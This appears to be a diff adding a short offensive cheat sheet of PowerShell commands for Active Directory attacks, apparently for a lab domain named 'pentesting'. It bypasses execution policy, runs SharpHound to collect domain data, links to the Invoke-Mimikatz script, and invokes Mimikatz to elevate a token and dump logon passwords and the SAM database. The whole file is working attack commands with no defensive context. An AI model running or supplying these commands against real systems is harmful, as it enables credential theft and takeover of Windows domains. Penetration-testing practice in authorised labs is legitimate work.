@@ -1,0 +1,9 @@
+#powershell -ep bypass
+import-module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -Verbose -Domain pentesting
+
+#Download Mimikatz:
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1
+
+#import-module .\Invoke-Mimikatz
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
